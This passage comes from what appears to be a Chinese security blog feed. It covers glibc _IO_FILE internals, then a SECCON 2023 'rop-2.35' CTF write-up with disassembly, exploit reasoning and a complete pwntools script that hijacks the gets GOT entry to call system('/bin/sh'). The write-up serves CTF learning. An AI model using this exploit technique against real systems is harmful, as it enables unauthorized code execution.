class="number">1</span>);<span class="comment">//读写平衡</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>如果_IO_IS_APPENDING被置位，说明文件对象是以追加方式打开的，所以将fp-&gt;_offset赋值为_IO_pos_BAD，即定位到文件末尾；</p></li><li><p>如果不是追加模式，就要考虑读写buffer块地址的信息了，读的尾指针不等于写的基指针，说明之前读写过程不一致，现在我们需要写入信息，所以需要调用_IO_SYSSEEK进行调整，基于当前的位置（1表示SEEK_CUR）将两者调整到一致。</p><ul><li>如果返回结果是异常的-1，那就直接返回0，表示写入字节数为0.</li><li>否则使用新的位置信息更新fp-&gt;_offset</li></ul></li><li>调用系统调用_IO_SYSWRITE (fp, data, to_do);</li><li>如果当前列参数不等于0(即第一列)，而且写入的字符数不等于0，此时需要更新列参数，调用_IO_adjust_column函数实现。</li><li>调用_IO<em>setg将读相关的base、ptr、end更新为_IO_buf_base；然后将写相关的base、ptr更新为_IO_buf_base。</em></li></ul><p>注意最后的w-end会根据当前的模式选择是等于_IO_buf_base还是_IO_buf_end：</p><ul><li>如果fp-&gt;_mode &lt;= 0，说明是标准字符，fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)说明是按行为buffer单位或没有缓存buffer，这种情况将写end置为_IO_buf_base，即无法使用buffer，否则则是可以使用buffer的情况，置为_IO_buf_end，可以使用base到end这块空间作为写缓存。</li></ul><p>看一下col调整函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>就是更新最后一行的列</p><ul><li><p>首先ptr指向真正写入的最后一个字符；</p></li><li><p>当ptr大于line，即从后向前遍历字符，如果找到换行符，则结束，说明之前遍历的位于写入的最后一行，此时line + count - ptr - 1表示最后一行的字符数，返回该值即可；</p></li><li><p>如果没有找到换行符，那就返回start + count，即之前的列号加真正写入的字符数。</p></li></ul><p>最后在外层再加1得到当前行的列号，整体的逻辑就是要更新当前的列号。</p><h2 id="seek"><a href="#seek" class="headerlink" title="seek"></a>seek</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_file_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __lseek64 (fp-&gt;_fileno, offset, dir);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_seek)</span><br></pre></td></tr></table></figure><p>seek就是调用lseek</p><p>返回成功后的偏移地址如果错误返回-1</p><h2 id="stat-1"><a href="#stat-1" class="headerlink" title="stat"></a>stat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_stat (FILE *fp, <span class="type">void</span> *st)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fxstat64 (_STAT_VER, fp-&gt;_fileno, (<span class="keyword">struct</span> stat64 *) st);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_stat)</span><br></pre></td></tr></table></figure><p>调用stat系统调用</p><p>返回一个stat结构体</p><h2 id="underflow"><a href="#underflow" class="headerlink" title="underflow"></a>underflow</h2><p>underflow主要负责从文件中读取数据到缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//注意读的大小时缓冲区的大小,这意味r-end可能会向后移动很多,从而导致读写不一致(_offset偏后)</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><ol><li><p>如果已经到达文件末尾返回EOF</p></li><li><p>如果文件不允许读,设置错误并返回EOF</p></li><li><p>如果r-ptr&lt;r-end返回r-ptr指向的字符</p></li><li><p>如果buf为空</p><ul><li>如果_IO_save_base不为空先将其释放,并取消_IO_IN_BACKUP标志位</li><li>申请buf</li></ul></li><li><p>如果是行缓冲或无缓冲模式</p><ul><li>给stdout上锁</li><li>如果stdout是行缓冲且在_IO_list_all链上且不禁止写,对stdout调用overflow</li><li>将stdout解锁</li></ul></li><li><p>调用_IO_switch_to_get_mode (fp);</p></li><li><p>更新读写缓冲区所有指针为fp-&gt;_IO_buf_base</p></li><li><p>调用系统调用_IO_SYSREAD(fp, fp-&gt;_IO_buf_base,</p><p>​      fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</p></li><li><p>,返回值为count</p></li><li><p>如果count&lt;=0</p><ul><li>如果count为0,文件标志设置到达末尾</li><li>如果count小于0,设置错误标志,并将count置为0</li></ul></li><li><p>r-end向后移动count</p></li><li><p>如果count为0,将fp-&gt;_offset设置为-1(文件末尾)并返回EOF</p></li><li><p>如果fp-&gt;_offset不为-1,fp-&gt;_offset移动到当前位置向后count字节</p></li><li><p>返回r-ptr指向的字符</p></li></ol><p>看以下其中调用的_IO_switch_to_get_mode (fp);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_get_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_ptr = fp-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_get_mode)</span><br></pre></td></tr></table></figure><ol><li>如果w-ptr&gt;w-base说明输出缓冲区还有数据尚未写入文件,调用_IO_OVERFLOW (fp, EOF)</li><li>如果处于备份模式fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;<ul><li>否则fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;<ul><li>如果w-ptr&gt;r-end,r-end=w-ptr</li></ul></li></ul></li><li>r-ptr被赋值为w-ptr,write的所有指针置为r-ptr</li><li>取消文件流的_IO_CURRENTLY_PUTTING标志位</li></ol><p>感觉有些指针操作有些多余了,underflow外层中都会统一更新赋值</p><h2 id="uflow"><a href="#uflow" class="headerlink" title="uflow"></a>uflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><ol><li>调用underflow</li><li>如果underflow返回值为EOF,返回EOF</li><li>否则返回fp-&gt;_IO_read_ptr处的字符</li></ol><h2 id="sync-1"><a href="#sync-1" class="headerlink" title="sync"></a>sync</h2><p>sync负责平衡读写,将未写入的数据写入文件,将未读取的数据去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;<span class="comment">//读平衡,真正只读到ptr,但实际读到end</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);<span class="comment">//将多余的去除</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;<span class="comment">//平衡</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><h2 id="imbue"><a href="#imbue" class="headerlink" title="imbue"></a>imbue</h2><p>在2.31中是个空函数</p><h2 id="showmanyc"><a href="#showmanyc" class="headerlink" title="showmanyc"></a>showmanyc</h2><p>在2.31中是个空函数</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> _IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平时比赛题录</title>
      <link href="/posts/26406/"/>
      <url>/posts/26406/</url>
      
        <content type="html"><![CDATA[<h1 id="2023seccon-rop-2-35"><a href="#2023seccon-rop-2-35" class="headerlink" title="2023seccon_rop-2.35"></a>2023seccon_rop-2.35</h1><p><strong>标签:栈溢出|栈迁移|got劫持|rop</strong></p><p><strong>难度:2</strong></p><p><strong>题目介绍:</strong>The number of ROP gadgets is declining worldwide.</p><p> <strong>解析:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;echo Enter something:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序就两行代码</p><p>汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401156                               public main</span><br><span class="line">.text:0000000000401156                               main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               var_10= byte ptr -10h</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; __unwind &#123;</span><br><span class="line">.text:0000000000401156 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:000000000040115A 55                            push    rbp</span><br><span class="line">.text:000000000040115B 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000040115E 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br><span class="line">.text:000000000040117D</span><br><span class="line">.text:0000000000401182 90                            nop</span><br><span class="line">.text:0000000000401183 C9                            leave</span><br><span class="line">.text:0000000000401184 C3                            retn</span><br><span class="line">.text:0000000000401184                               ; &#125; // starts at 401156</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               main endp</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               _text ends</span><br><span class="line">.text:0000000000401184</span><br></pre></td></tr></table></figure><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>保护基本不用考虑</p><p>常规思路自然是泄露libc等</p><p>不过这题程序没有单独使用过输出函数</p><p>唯一一次输出使用system实现的</p><p>因此根本无法做到泄露</p><hr><p>第一次错误想法:</p><p>如下,可以发现gets的参数是由rbp确定的(rbp-0x10)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>那么修改rbp就可以做到任意写了</p><p>看到以下这段代码,升起了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure><p>修改command处字符串为/bin/sh</p><p>之后再rop到代码中执行system处</p><p>并在此之前做栈迁移,防止system栈越界</p><p>不过这个想法直接胎死腹中了</p><p>因为command所在段根本没有写权限</p><hr><p>第二个思路:</p><p>同样是利用gets参数由rbp确定的</p><p>可以看到gets参数可控,system参数不可控</p><p>但如果把<strong>gets函数劫持为system</strong></p><p>那就可以<strong>执行可控参数的system函数</strong>了</p><p>具体实施:</p><p>首先栈溢出让程序再次执行以一次gets(返回时leave已经修改rbp为可写gets的got表处)</p><p>这样在第二次gets的时候修改gets的got表为</p><p>system@plt+binsh字符串+目标rbp+lr+填充padding+binsh地址+0x10+0x401171</p><p>为了让system栈不越界还得再次栈迁移将栈往高处迁移</p><p>并将rbp控制位为-0x10刚好为binsh字符串</p><p>这样返回执行以下代码时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>实际上执行的就是system(‘/bin/sh’)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;rop-2-35.seccon.games&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">rbp1=<span class="number">0x404030</span></span><br><span class="line">pr=<span class="number">0x40113d</span></span><br><span class="line">gets=<span class="number">0x401171</span></span><br><span class="line">lr=<span class="number">0x401183</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rbp1)+p64(gets))</span><br><span class="line">p.sendline(p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x404800</span>)+p64(lr)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7c0</span>+p64(<span class="number">0x404038</span>)+p64(gets))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="其它题解"><a href="#其它题解" class="headerlink" 